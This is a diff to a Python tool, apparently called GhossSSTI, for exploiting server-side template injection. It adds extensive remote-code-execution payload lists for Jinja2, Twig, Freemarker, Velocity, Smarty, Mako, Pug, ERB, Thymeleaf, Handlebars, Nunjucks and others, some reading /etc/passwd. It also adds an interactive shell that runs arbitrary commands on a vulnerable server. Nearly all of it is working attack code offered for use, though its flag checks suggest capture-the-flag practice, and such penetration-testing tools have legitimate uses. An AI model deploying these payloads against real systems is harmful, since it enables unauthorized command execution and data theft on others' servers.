@@ -26,12 +26,13 @@ class GhossSSTI:
                  proxy: str = None, timeout: int = 15, 
                  trigger_url: str = None, trigger_method: str = "GET",
                  trigger_data: Dict = None, scan_mode: bool = False,
-                 ssi_mode: bool = False, xslt_mode: bool = False):
+                 ssi_mode: bool = False, xslt_mode: bool = False,
+                 injection_point: str = None):
         self.url = url
         self.parameter = parameter
         self.method = method.upper()
         self.data = data or {}
-        self.headers = headers or {"User-Agent": "GHOSSSTI/4.0"}
+        self.headers = headers or {"User-Agent": "GHOSSTTI/4.0"}
         self.cookies = cookies or {}
         self.proxy = {"http": proxy, "https": proxy} if proxy else None
         self.timeout = timeout
@@ -44,6 +45,10 @@ class GhossSSTI:
         self.scan_mode = scan_mode
         self.ssi_mode = ssi_mode
         self.xslt_mode = xslt_mode
+        self.injection_point = injection_point  # Custom injection point
+        self.working_payload_template = None  # Store working RCE payload template
+        self.last_payload = None  # Store last used payload for display
+        self.last_payload = None  # Store last successful payload for display
         self.found_vulnerabilities = []
         
         # Two-endpoint support
@@ -158,37 +163,168 @@ class GhossSSTI:
             ],
         }
         
-        # RCE payloads
+        # RCE payloads - Comprehensive for all engines
         self.rce_payloads = {
             "Twig": [
+                # Filter method (most reliable)
                 "{{['{CMD}']|filter('system')}}",
                 "{{['{CMD}']|filter('passthru')}}",
                 "{{['{CMD}']|filter('exec')}}",
                 "{{['{CMD}']|filter('shell_exec')}}",
+                # Map method
                 "{{['{CMD}']|map('system')|join}}",
+                "{{['{CMD}']|map('passthru')|join}}",
+                "{{['{CMD}']|map('exec')|join}}",
+                "{{['{CMD}']|map('shell_exec')|join}}",
+                # Reduce method
+                "{{['{CMD}']|reduce((c,v)=>c~(v|filter('system')),'')}}",
+                "{{['{CMD}']|reduce((c,v)=>c~(v|filter('passthru')),'')}}",
+                # Array sort method
+                "{{['{CMD}',0]|sort('system')}}",
+                "{{['{CMD}',0]|sort('passthru')}}",
             ],
             "Jinja2": [
-                "{{config.__class__.__init__.__globals__['os'].popen('{CMD}').read()}}",
+                # Lipsum method (most common)
                 "{{lipsum.__globals__.os.popen('{CMD}').read()}}",
+                "{{lipsum.__globals__['os'].popen('{CMD}').read()}}",
+                # Config method
+                "{{config.__class__.__init__.__globals__['os'].popen('{CMD}').read()}}",
+                "{{config.__class__.__init__.__globals__.os.popen('{CMD}').read()}}",
+                # Cycler method
                 "{{cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
+                "{{cycler.__init__.__globals__['os'].popen('{CMD}').read()}}",
+                # Joiner method
+                "{{joiner.__init__.__globals__.os.popen('{CMD}').read()}}",
+                "{{joiner.__init__.__globals__['os'].popen('{CMD}').read()}}",
+                # Namespace method
+                "{{namespace.__init__.__globals__.os.popen('{CMD}').read()}}",
+                "{{namespace.__init__.__globals__['os'].popen('{CMD}').read()}}",
+                # Request method (Flask)
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read()}}",
+                "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}",
+                # Subprocess method
+                "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
+                # Get_flashed_messages (Flask)
+                "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
             ],
             "Freemarker": [
+                # Execute utility (most common)
                 "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}",
+                "<#assign ex='freemarker.template.utility.Execute'?new()>Exec:${ex('{CMD}')}",
+                # ObjectConstructor with Runtime.exec
                 "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime').getRuntime()><#assign proc=rt.exec('{CMD}')>${proc}",
+                # JythonRuntime (if Jython available)
+                "<#assign ex='freemarker.template.utility.JythonRuntime'?new()><#assign os=ex.getModule('os')>${os.system('{CMD}')}",
+                # Multiple ObjectConstructor methods
+                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime')><#assign exec=rt.getRuntime().exec('{CMD}')>",
+                # ProcessBuilder
+                "<#assign pb='java.lang.ProcessBuilder'?new('sh','-c','{CMD}')><#assign proc=pb.start()>",
             ],
             "Velocity": [
+                # Runtime.exec method 1
                 "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('{CMD}'))##",
+                # Runtime.exec method 2
+                "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))",
+                # ProcessBuilder
+                "#set($pb=$class.inspect('java.lang.ProcessBuilder').type)\n#set($p=$pb.getDeclaredConstructors().get(0).newInstance($arr))\n#set($p=$p.command('sh','-c','{CMD}'))\n#set($p=$p.start())",
+                # Class.forName
+                "#set($s=''.toString().getClass().forName('java.lang.Runtime').getRuntime().exec('{CMD}'))",
             ],
             "Smarty": [
+                # PHP tag (Smarty 2)
                 "{php}system('{CMD}');{/php}",
                 "{php}echo `{CMD}`;{/php}",
+                "{php}passthru('{CMD}');{/php}",
+                "{php}shell_exec('{CMD}');{/php}",
+                # Function calling (Smarty 3)
+                "{system('{CMD}')}",
+                "{exec('{CMD}')}",
+                "{passthru('{CMD}')}",
+                "{shell_exec('{CMD}')}",
+                # Literal with PHP
+                "{literal}<?php system('{CMD}'); ?>{/literal}",
+                # Self methods
+                "{$smarty.template_object->smarty->_getSmartyObj()->smarty->security_policy = null}{system('{CMD}')}",
             ],
             "Mako": [
+                # Import os (most common)
                 "<%import os%>${os.popen('{CMD}').read()}",
+                "<%import os%>${os.system('{CMD}')}",
+                # Subprocess
+                "<%import subprocess%>${subprocess.check_output('{CMD}',shell=True)}",
+                "<%import subprocess%>${subprocess.Popen('{CMD}',shell=True,stdout=subprocess.PIPE).communicate()[0]}",
+                # Exec
+                "<%!import os%>${os.popen('{CMD}').read()}",
+                "<%!import os%>${os.system('{CMD}')}",
+                # Direct exec
+                "<%exec(\"import os;os.popen('{CMD}').read()\")%>",
+            ],
+            "Pug": [
+                # Buffered code
+                "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('{CMD}')}()}",
+                "#{global.process.mainModule.require('child_process').exec('{CMD}')}",
+                "#{process.mainModule.require('child_process').execSync('{CMD}').toString()}",
+                # Unbuffered code
+                "- var x=global.process.mainModule.require('child_process').execSync('{CMD}').toString()\n=x",
+                # Direct require
+                "#{require('child_process').exec('{CMD}')}",
+                "#{require('child_process').execSync('{CMD}').toString()}",
             ],
             "ERB": [
+                # Backticks (most common)
                 "<%= `{CMD}` %>",
+                # System call
                 "<%= system('{CMD}') %>",
+                "<%= exec('{CMD}') %>",
+                # Open3
+                "<%= require 'open3'; Open3.capture2('{CMD}')[0] %>",
+                # IO.popen
+                "<%= IO.popen('{CMD}').read %>",
+                # %x notation
+                "<%= %x[{CMD}] %>",
+                # Kernel.system
+                "<%= Kernel.system('{CMD}') %>",
+            ],
+            "Django": [
+                # Debug trick (if debug=True)
+                "{{request.META.items}}",
+                # Load tag abuse
+                "{% load log %}{% get_logger 'os' as os %}{{os.system('{CMD}')}}",
+                # Custom template tags (if available)
+                "{% load custom %}{% system '{CMD}' %}",
+                # Exec via debug
+                "{% debug %}",
+            ],
+            "Tornado": [
+                # Handler methods
+                "{{handler.settings}}",
+                "{{handler.application.settings}}",
+                # Import trick
+                "{% import os %}{{os.popen('{CMD}').read()}}",
+                "{% import subprocess %}{{subprocess.check_output('{CMD}',shell=True)}}",
+            ],
+            "Handlebars": [
+                # Prototype pollution to RCE (Node.js)
+                "{{#with 'constructor'}}{{#with split as |a|}}{{pop (push 'return process.mainModule.require(\"child_process\").execSync(\"{CMD}\");')}}{{#each (a 0 1)}}{{}}{{/each}}{{/with}}{{/with}}",
+                # Lookup helper
+                "{{lookup (__lookupGetter__ 'constructor') 'constructor' 'return process.mainModule.require(\"child_process\").execSync(\"{CMD}\");'}}",
+            ],
+            "Thymeleaf": [
+                # SpringEL injection
+                "${T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
+                "*{T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
+                # ProcessBuilder
+                "${T(java.lang.ProcessBuilder).start(new String[]{'/bin/sh','-c','{CMD}'})}",
+                # Alternative methods
+                "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())}",
+            ],
+            "Nunjucks": [
+                # Range constructor
+                "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('{CMD}')\")()\n}}",
+                # Global access
+                "{{constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"{CMD}\")')()}}",
+                # Direct require
+                "{{process.mainModule.require('child_process').execSync('{CMD}').toString()}}",
             ],
             "SSI": [
                 "<!--#exec cmd=\"{CMD}\" -->",
@@ -243,38 +379,49 @@ class GhossSSTI:
         params = []
         parsed = urlparse(self.url)
         
-        # GET parameters
+        # GET parameters from URL
         if parsed.query:
             get_params = parse_qs(parsed.query)
             for param in get_params.keys():
                 params.append((param, "GET", self.url))
                 print(f"  {Fore.CYAN}[+] Found GET parameter: {param}{Style.RESET_ALL}")
         
-        # POST parameters from forms
-        try:
-            response = self.session.get(
-                self.url,
-                headers=self.headers,
-                cookies=self.cookies,
-                proxies=self.proxy,
-                timeout=self.timeout,
-                verify=False
-            )
-            
-            form_params = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
-            for param in form_params:
+        # POST parameters from -d flag (command line data)
+        if self.data:
+            for param, value in self.data.items():
                 params.append((param, "POST", self.url))
                 print(f"  {Fore.CYAN}[+] Found POST parameter: {param}{Style.RESET_ALL}")
-            
-            if not params:
-                common_params = ['name', 'search', 'q', 'query', 'text', 'message', 
-                                'comment', 'title', 'content', 'data', 'input']
-                for param in common_params:
-                    params.append((param, "GET", self.url))
-                print(f"  {Fore.YELLOW}[*] No parameters found, testing common names{Style.RESET_ALL}")
+                
+                # Auto-detect injection point marker
+                if '*INJECT*' in str(value) or '*inject*' in str(value):
+                    self.injection_point = True
+                    print(f"  {Fore.GREEN}[+] Detected injection point marker in {param}{Style.RESET_ALL}")
         
-        except Exception as e:
-            print(f"  {Fore.RED}[!] Error discovering parameters: {e}{Style.RESET_ALL}")
+        # POST parameters from forms (only if no data provided)
+        if not self.data:
+            try:
+                response = self.session.get(
+                    self.url,
+                    headers=self.headers,
+                    cookies=self.cookies,
+                    proxies=self.proxy,
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                # Look for form inputs
+                form_params = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
+                form_params += re.findall(r'<textarea[^>]+name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
+                
+                for param in set(form_params):  # Use set to avoid duplicates
+                    params.append((param, "POST", self.url))
+                    print(f"  {Fore.CYAN}[+] Found POST parameter in form: {param}{Style.RESET_ALL}")
+            
+            except Exception as e:
+                print(f"  {Fore.YELLOW}[!] Could not fetch page for form discovery: {e}{Style.RESET_ALL}")
+        
+        if not params:
+            print(f"  {Fore.RED}[!] No parameters found. Use -d for POST data or add ?param=value to URL{Style.RESET_ALL}")
         
         return params
 
@@ -292,10 +439,13 @@ class GhossSSTI:
                     timeout=self.timeout,
                     verify=False
                 )
-            else:
+            else:  # POST
+                # Use existing POST data and replace the parameter value
+                post_data = self.data.copy() if self.data else {}
+                post_data[param] = payload
                 response = self.session.post(
                     test_url,
-                    data={param: payload},
+                    data=post_data,
                     headers=self.headers,
                     cookies=self.cookies,
                     proxies=self.proxy,
@@ -303,11 +453,32 @@ class GhossSSTI:
                     verify=False
                 )
             
+            # Check if expected pattern is in response
             if re.search(expected, response.text, re.IGNORECASE):
-                if payload not in response.text or len(payload) < 10:
-                    return True
+                # CRITICAL: Make sure payload is not just echoed back
+                # If payload appears in response unchanged, it's likely a false positive
+                clean_payload = urllib.parse.unquote(payload).lower()
+                response_lower = response.text.lower()
+                
+                # For short payloads (like "test"), require exact match not found
+                if len(payload) < 15:
+                    if clean_payload in response_lower:
+                        # Payload is echoed, likely false positive
+                        return False
+                
+                # For longer payloads, check if they're just reflected
+                if len(payload) > 15 and clean_payload in response_lower:
+                    # Count how many times it appears
+                    count = response_lower.count(clean_payload)
+                    if count > 0:
+                        # It's being reflected, not executed
+                        return False
+                
+                # Passed checks, likely vulnerable
+                return True
+            
             return False
-        except:
+        except Exception as e:
             return False
 
     def scan_all_vulnerabilities(self):
@@ -435,12 +606,26 @@ class GhossSSTI:
             
             print(f"{Fore.YELLOW}[→] {vuln_type} - {param} parameter:{Style.RESET_ALL}")
             cmd = f"./ghosssti.py -u \"{url}\" -p \"{param}\""
+            
+            # Add method if POST
             if method == "POST":
                 cmd += f" -m POST"
+            
+            # Add POST data if available
+            if self.data:
+                data_str = "&".join([f"{k}={v}" for k, v in self.data.items()])
+                cmd += f" -d \"{data_str}\""
+                
+                # Check if injection point was used
+                if self.injection_point or any('*INJECT*' in str(v) or '*inject*' in str(v) for v in self.data.values()):
+                    cmd += " --inject-point"
+            
+            # Add mode flags
             if vuln_type == "SSI":
                 cmd += " --ssi-mode"
             elif vuln_type == "XSLT":
                 cmd += " --xslt-mode"
+            
             cmd += " --os-shell"
             print(f"{Fore.WHITE}{cmd}{Style.RESET_ALL}\n")
 
@@ -469,7 +654,16 @@ class GhossSSTI:
                 )
             else:
                 data = self.data.copy()
-                data[param] = payload
+                
+                # Check if injection point is specified (case-insensitive)
+                param_value = str(data.get(param, ''))
+                if self.injection_point and ('*INJECT*' in param_value or '*inject*' in param_value):
+                    # Replace *INJECT* or *inject* with payload
+                    data[param] = param_value.replace('*INJECT*', payload).replace('*inject*', payload)
+                else:
+                    # Normal: replace entire parameter value
+                    data[param] = payload
+                
                 inject_response = self.session.post(
                     self.url,
                     data=data,
@@ -712,13 +906,30 @@ class GhossSSTI:
         """Detect capabilities"""
         print(f"\n{Fore.YELLOW}[*] Detecting capabilities...{Style.RESET_ALL}")
         
-        if self.test_command_silent("echo GHOSSSTI_TEST", "GHOSSSTI_TEST"):
-            self.capabilities['shell_cmd'] = True
-            print(f"{Fore.GREEN}  [+] Shell command execution: OK{Style.RESET_ALL}")
-            self.detect_os()
-        else:
+        # Test command execution with multiple simple tests
+        test_commands = [
+            ("echo GHOSSSTI_TEST", "GHOSSSTI_TEST"),
+            ("id", "uid="),
+            ("whoami", "root|www-data|nginx|apache|user"),
+        ]
+        
+        cmd_works = False
+        for test_cmd, expected in test_commands:
+            if self.test_command_silent(test_cmd, expected):
+                self.capabilities['shell_cmd'] = True
+                cmd_works = True
+                print(f"{Fore.GREEN}  [+] Shell command execution: OK (tested: {test_cmd}){Style.RESET_ALL}")
+                if self.working_payload_template:
+                    # Show which payload works (truncated for readability)
+                    template_preview = self.working_payload_template.replace("{CMD}", "CMD")[:60]
+                    print(f"{Fore.CYAN}  [+] Working payload: {template_preview}...{Style.RESET_ALL}")
+                self.detect_os()
+                break
+        
+        if not cmd_works:
             self.capabilities['shell_cmd'] = False
             print(f"{Fore.YELLOW}  [-] Shell command execution: Failed{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}  [!] Note: Some RCE methods may still work. Try interactive mode.{Style.RESET_ALL}")
         
         self.capabilities['file_read'] = False
         self.capabilities['file_write'] = False
@@ -728,10 +939,10 @@ class GhossSSTI:
         print(f"  {Fore.WHITE}Engine: {self.detected_engine}{Style.RESET_ALL}")
         print(f"  {Fore.WHITE}OS: {self.os_type or 'unknown'}{Style.RESET_ALL}")
         print(f"  {Fore.WHITE}Capabilities:{Style.RESET_ALL}")
-        print(f"    {Fore.GREEN if self.capabilities.get('shell_cmd') else Fore.RED}Shell command execution: {'OK' if self.capabilities.get('shell_cmd') else 'NO'}{Style.RESET_ALL}")
+        print(f"    {Fore.GREEN if self.capabilities.get('shell_cmd') else Fore.YELLOW}Shell command execution: {'OK' if self.capabilities.get('shell_cmd') else 'Uncertain (try anyway)'}{Style.RESET_ALL}")
 
     def test_command_silent(self, cmd: str, expected_output: str) -> bool:
-        """Test command silently"""
+        """Test command silently and store working payload template"""
         if not self.detected_engine or not self.vulnerable_param:
             return False
         
@@ -740,11 +951,14 @@ class GhossSSTI:
         
         payloads = self.rce_payloads[self.detected_engine]
         
-        for template in payloads[:2]:
+        # Try each payload template
+        for template in payloads:
             payload = template.replace("{CMD}", cmd)
             response = self.make_request(payload, self.vulnerable_param)
             
             if response and expected_output.lower() in response.lower():
+                # Store the working template for future use
+                self.working_payload_template = template
                 return True
         
         return False
@@ -770,41 +984,160 @@ class GhossSSTI:
             params = ['name', 'user', 'search', 'q', 'template']
         return params
 
-    def execute_command(self, command: str) -> Optional[str]:
+    def execute_command(self, command: str, debug: bool = False) -> Optional[str]:
         """Execute command"""
-        if not self.capabilities.get('shell_cmd'):
-            print(f"{Fore.RED}[!] Command execution not available{Style.RESET_ALL}")
-            return None
-        
         # SSI mode
         if self.detected_engine == "SSI":
             payload = f"<!--#exec cmd=\"{command}\" -->"
+            if debug:
+                print(f"{Fore.DARK_GREY}[DEBUG] Testing SSI payload: {payload}{Style.RESET_ALL}")
             response = self.make_request(payload, self.vulnerable_param)
             if response and response != self.baseline_response:
                 return response
             return None
         
-        # SSTI mode
+        # SSTI mode - always try all payloads for accuracy
         payloads = self.rce_payloads.get(self.detected_engine, [])
         
-        for template in payloads:
-            payload = template.replace("{CMD}", command)
+        if not payloads:
+            return None
+        
+        cmd_lower = command.lower().strip()
+        cmd_parts = cmd_lower.split()
+        cmd_base = cmd_parts[0] if cmd_parts else cmd_lower
+        
+        # For Twig, escape spaces with \x20 for better compatibility
+        if self.detected_engine == "Twig":
+            # Use raw string replacement - literally the 4 characters: \ x 2 0
+            command_encoded = command.replace(' ', r'\x20')
+        else:
+            command_encoded = command
+        
+        if debug:
+            print(f"{Fore.DARK_GREY}[DEBUG] Original command: {command}{Style.RESET_ALL}")
+            print(f"{Fore.DARK_GREY}[DEBUG] Encoded command: {command_encoded}{Style.RESET_ALL}")
+            print(f"{Fore.DARK_GREY}[DEBUG] Testing {len(payloads)} payloads...{Style.RESET_ALL}")
+        
+        for idx, template in enumerate(payloads, 1):
+            payload = template.replace("{CMD}", command_encoded)
+            
+            if debug:
+                print(f"{Fore.DARK_GREY}[DEBUG] [{idx}/{len(payloads)}] Payload: {payload[:100]}...{Style.RESET_ALL}")
+            
             response = self.make_request(payload, self.vulnerable_param)
             
-            if response and response != self.baseline_response:
-                if "uid=" in response or "root:" in response or "www-data" in response or len(response) > 200:
-                    return response
+            if not response or response == self.baseline_response:
+                if debug:
+                    print(f"{Fore.DARK_GREY}[DEBUG] [{idx}/{len(payloads)}] No change in response{Style.RESET_ALL}")
+                continue
+            
+            response_lower = response.lower()
+            
+            # Check for command-specific output
+            found_match = False
+            
+            # For 'id' command
+            if 'id' == cmd_base and 'uid=' in response_lower:
+                found_match = True
+            
+            # For 'whoami' command
+            elif 'whoami' == cmd_base and any(u in response_lower for u in ['root', 'www-data', 'nginx', 'apache', 'user']):
+                found_match = True
+            
+            # For 'ls' or 'dir' command
+            elif cmd_base in ['ls', 'dir']:
+                # If response changed at all, it probably worked
+                if response != self.baseline_response:
+                    # Check for typical file/directory indicators
+                    if any(i in response_lower for i in [
+                        'total ', 'drwx', '-rw-', '-r--',  # ls -l format
+                        '.txt', '.php', '.html', '.js', '.json', '.py', '.sh',  # files
+                        '.lock', '.md', '.yml', '.yaml', '.xml', '.conf',  # more files
+                        'vendor', 'composer', 'node_modules', 'src', 'public',  # directories
+                        'bin', 'etc', 'var', 'usr', 'home', 'tmp', 'opt',  # system dirs
+                    ]):
+                        found_match = True
+                    # Or if response changed significantly
+                    elif abs(len(response) - len(self.baseline_response)) > 20:
+                        found_match = True
+            
+            # For 'cat', 'type', 'head', 'tail' commands
+            elif cmd_base in ['cat', 'type', 'head', 'tail', 'more', 'less']:
+                # If response changed at all, it probably worked
+                if response != self.baseline_response:
+                    # Check if it's significantly different
+                    if abs(len(response) - len(self.baseline_response)) > 10:
+                        found_match = True
+                    # Or contains typical file content indicators
+                    elif any(indicator in response_lower for indicator in [
+                        'htb{', 'flag{', 'ctf{',  # flags
+                        '<?php', '#!/', 'import ', 'function',  # code
+                        'root:', '/bin/', '/usr/',  # file paths
+                        '# ', '## ', '/*',  # comments
+                    ]):
+                        found_match = True
+            
+            # For 'pwd' command
+            elif 'pwd' == cmd_base and ('/' in response_lower or '\\' in response_lower or 'var' in response_lower or 'www' in response_lower):
+                found_match = True
+            
+            # For 'echo' command
+            elif 'echo' == cmd_base:
+                # Extract what we're echoing
+                echo_parts = command.split('echo', 1)
+                if len(echo_parts) > 1:
+                    echo_text = echo_parts[1].strip().strip('"').strip("'").lower()
+                    if echo_text and (echo_text in response_lower or echo_text[:10] in response_lower):
+                        found_match = True
+                elif len(response) != len(self.baseline_response):
+                    found_match = True
+            
+            # For 'hostname' command
+            elif 'hostname' == cmd_base and len(response) > len(self.baseline_response):
+                found_match = True
+            
+            # For 'uname' command
+            elif 'uname' == cmd_base and ('linux' in response_lower or 'darwin' in response_lower or 'unix' in response_lower):
+                found_match = True
+            
+            # For 'find' command
+            elif 'find' == cmd_base and ('/' in response_lower or abs(len(response) - len(self.baseline_response)) > 30):
+                found_match = True
+            
+            # For 'grep' command
+            elif 'grep' == cmd_base and len(response) != len(self.baseline_response):
+                found_match = True
+            
+            # Generic check - if response changed at all from baseline, command worked
+            elif response != self.baseline_response:
+                found_match = True
+            
+            if found_match:
+                self.working_payload_template = template  # Cache for next time
+                # Store the actual payload used for display
+                self.last_payload = payload
+                if debug:
+                    print(f"{Fore.GREEN}[DEBUG] [{idx}/{len(payloads)}] SUCCESS! Payload worked{Style.RESET_ALL}")
+                return response
+            elif debug:
+                print(f"{Fore.YELLOW}[DEBUG] [{idx}/{len(payloads)}] Response changed but didn't match criteria{Style.RESET_ALL}")
         
+        if debug:
+            print(f"{Fore.RED}[DEBUG] All {len(payloads)} payloads failed{Style.RESET_ALL}")
         return None
 
     def os_shell(self):
         """Interactive shell"""
         if not self.capabilities.get('shell_cmd'):
-            print(f"{Fore.RED}[!] Shell command execution not available{Style.RESET_ALL}")
-            return
+            print(f"{Fore.YELLOW}[!] Shell command execution detection failed, but trying anyway...{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[!] Some payloads may still work even if detection failed{Style.RESET_ALL}\n")
+        else:
+            print(f"\n{Fore.GREEN}[+] Run commands on the operating system{Style.RESET_ALL}")
         
-        print(f"\n{Fore.GREEN}[+] Run commands on the operating system{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] TIP: Type 'payload' to see the last used payload{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] TIP: Type 'debug' to toggle debug mode{Style.RESET_ALL}\n")
         prompt = f"{self.os_type or 'shell'} $ "
+        debug_mode = False
         
         while True:
             try:
@@ -816,10 +1149,29 @@ class GhossSSTI:
                 if cmd.lower() in ['exit', 'quit', 'q']:
                     break
                 
-                result = self.execute_command(cmd)
+                # Toggle debug mode
+                if cmd.lower() == 'debug':
+                    debug_mode = not debug_mode
+                    status = "ON" if debug_mode else "OFF"
+                    print(f"{Fore.YELLOW}[*] Debug mode: {status}{Style.RESET_ALL}")
+                    continue
+                
+                # Show last payload
+                if cmd.lower() == 'payload':
+                    if self.last_payload:
+                        print(f"\n{Fore.YELLOW}[*] Last successful payload:{Style.RESET_ALL}")
+                        print(f"{Fore.WHITE}{self.last_payload}{Style.RESET_ALL}\n")
+                    else:
+                        print(f"{Fore.YELLOW}[!] No payload used yet{Style.RESET_ALL}")
+                    continue
+                
+                result = self.execute_command(cmd, debug=debug_mode)
                 if result:
                     output = self.extract_output(result)
                     print(output)
+                    # Show payload on successful command (if not in debug mode, as debug shows more detail)
+                    if not debug_mode and hasattr(self, 'last_payload') and self.last_payload:
+                        print(f"{Fore.YELLOW}[Payload: {self.last_payload[:100]}...]{Style.RESET_ALL}")
                 else:
                     print(f"{Fore.YELLOW}[!] Command failed or no output{Style.RESET_ALL}")
             
@@ -830,23 +1182,69 @@ class GhossSSTI:
                 break
 
     def extract_output(self, response: str) -> str:
-        """Extract output"""
+        """Extract command output from response, handling JSON and HTML"""
+        if not response:
+            return ""
+        
+        # Try to parse as JSON first (common in API responses)
+        try:
+            import json
+            data = json.loads(response)
+            
+            # Check common JSON fields that might contain output
+            output_parts = []
+            for field in ['id', 'result', 'output', 'data', 'response', 'content', 'message', 'value', 'text']:
+                if field in data:
+                    value = str(data[field])
+                    # Remove "Array" suffix that Twig adds
+                    value = re.sub(r'\s*Array\s*$', '', value, flags=re.IGNORECASE | re.MULTILINE)
+                    value = value.strip()
+                    if value and len(value) > 0:
+                        # Check if this looks like actual command output (not just metadata)
+                        if not (value.isdigit() and len(value) < 5):  # Skip small numbers
+                            output_parts.append(value)
+            
+            if output_parts:
+                return '\n'.join(output_parts)
+            
+            # If no specific field, return the whole JSON pretty-printed
+            return json.dumps(data, indent=2)
+        except (json.JSONDecodeError, ValueError, TypeError):
+            pass
+        
+        # Not JSON, try HTML extraction
         text = re.sub(r'<[^>]+>', '\n', response)
         lines = text.split('\n')
         output_lines = []
         
+        # Filter out common noise
+        noise_patterns = [
+            'simple test server',
+            'your ip:',
+            'current time:',
+            '<!DOCTYPE',
+            '<html',
+            '</html>',
+            '<head',
+            '</head>',
+            '<body',
+            '</body>',
+        ]
+        
         for line in lines:
             line = line.strip()
-            if line and not any(x in line.lower() for x in ['simple test server', 'your ip:', 'current time:']):
+            if line and not any(noise.lower() in line.lower() for noise in noise_patterns):
                 output_lines.append(line)
         
         if output_lines:
-            result = '\n'.join(output_lines[:30])
+            result = '\n'.join(output_lines[:50])
+            # Clean up common artifacts
             result = re.sub(r'^Hi\s+', '', result)
-            result = re.sub(r'\s*Array!\s*$', '', result)
-            return result.strip() if result else response[:500]
+            result = re.sub(r'\s*Array!\s*$', '', result, flags=re.IGNORECASE)
+            result = re.sub(r'\s*Array\s*$', '', result, flags=re.IGNORECASE)
+            return result.strip() if result else response[:1000]
         
-        return response[:500]
+        return response[:1000]
 
     def interactive_mode(self):
         """Interactive mode"""
@@ -942,7 +1340,9 @@ Examples:
     parser.add_argument('-u', '--url', required=True, help='Target URL')
     parser.add_argument('-p', '--parameter', help='Parameter to test (exploitation mode)')
     parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'])
-    parser.add_argument('-d', '--data', help='POST data')
+    parser.add_argument('-d', '--data', help='POST data (key=value&key2=value2)')
+    parser.add_argument('--inject-point', action='store_true', 
+                       help='Use *INJECT* placeholder in data (e.g., -d "api=http://url/*INJECT*")')
     parser.add_argument('-H', '--headers', help='Headers')
     parser.add_argument('-c', '--cookies', help='Cookies')
     parser.add_argument('--proxy', help='Proxy URL')
@@ -1009,7 +1409,8 @@ Examples:
         trigger_data=trigger_data if trigger_data else None,
         scan_mode=args.scan,
         ssi_mode=args.ssi_mode,
-        xslt_mode=args.xslt_mode
+        xslt_mode=args.xslt_mode,
+        injection_point=args.inject_point if hasattr(args, 'inject_point') else None
     )
     
     tool.print_banner()
